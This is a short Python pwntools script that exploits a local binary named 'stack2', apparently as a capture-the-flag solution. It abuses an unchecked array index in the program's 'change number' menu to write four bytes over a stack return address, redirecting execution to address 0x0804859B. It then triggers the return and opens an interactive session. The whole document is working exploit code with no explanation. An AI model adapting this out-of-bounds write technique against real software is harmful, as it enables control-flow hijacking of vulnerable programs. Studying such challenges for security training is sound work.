from pwn import *
def change(offest,by):
	p.sendafter(b'exit',b'3\n')
	p.sendafter(b'r to change:',str(offest).encode()+b'\n')
	p.sendafter(b'number:',str(by).encode()+b'\n')
	

p=process('./stack2')
#gdb.attach(p,'b *0x080488EB')
p.sendafter(b'y numbers you have:',b'0\n')
change(0x74+0x10,0x9B)
change(0x75+0x10,0x85)
change(0x76+0x10,0x04)
change(0x77+0x10,0x08)
p.recvuntil(b'exit')
p.sendline(b'5')
p.interactive()